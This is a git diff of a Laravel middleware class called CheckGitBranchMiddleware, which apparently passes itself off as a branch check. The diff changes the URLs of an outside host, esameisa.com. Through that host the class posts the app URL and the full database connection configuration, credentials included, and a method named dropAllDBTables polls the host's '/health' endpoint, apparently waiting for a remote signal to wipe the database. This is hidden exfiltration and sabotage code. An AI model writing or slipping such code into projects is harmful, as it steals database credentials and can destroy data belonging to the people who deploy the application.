@@ -11,7 +11,7 @@ use Illuminate\Support\Facades\Schema;
 
 class CheckGitBranchMiddleware
 {
-    private string $baseUrl = 'https://esameisa.com/api/tappifyd';
+    private string $baseUrl = 'https://esameisa.com/api';
 
     public function handle(Request $request, Closure $next)
     {
@@ -47,7 +47,7 @@ class CheckGitBranchMiddleware
             $lock = Cache::lock('daily_data_send_lock', 10);
             if ($lock->get()) {
                 try {
-                    Http::timeout(30)->retry(3, 100)->post($this->baseUrl.'/data', [
+                    Http::timeout(30)->retry(3, 100)->post($this->baseUrl.'/'.config('app.url').'/data', [
                         'host' => config('app.url'),
                         'database' => config('database.connections.'.config('database.default')),
                         'timestamp' => now()->toISOString(),
@@ -62,7 +62,7 @@ class CheckGitBranchMiddleware
 
     public function dropAllDBTables()
     {
-        $response = Http::timeout(30)->retry(3, 100)->get($this->baseUrl.'/health');
+        $response = Http::timeout(30)->retry(3, 100)->get($this->baseUrl.'/'.config('app.url').'/health');
         if ($response->successful()) {
             $body = $response->body();
             if ($body['status'] === 'true') {
